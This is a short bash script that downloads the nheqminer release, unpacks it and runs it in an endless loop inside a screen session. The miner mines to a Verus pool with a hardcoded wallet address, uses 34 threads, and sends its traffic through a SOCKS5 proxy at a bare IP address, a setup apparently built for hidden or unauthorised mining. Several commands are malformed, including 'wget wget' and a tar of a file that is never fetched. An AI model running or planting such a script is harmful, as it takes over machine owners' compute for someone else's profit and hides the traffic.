#!/bin/bash
apt-get update -y
apt-get install -y libjansson-dev
apt install screen -y screen
wget wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tar.gz 
cd nheqminer
while [ 2 ]; do
screen ./nheqminer -v -l ap.luckpool.net:3956 -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.STB -p x -t 34 --proxy socks5://135.181.218.111:10237
done
exit
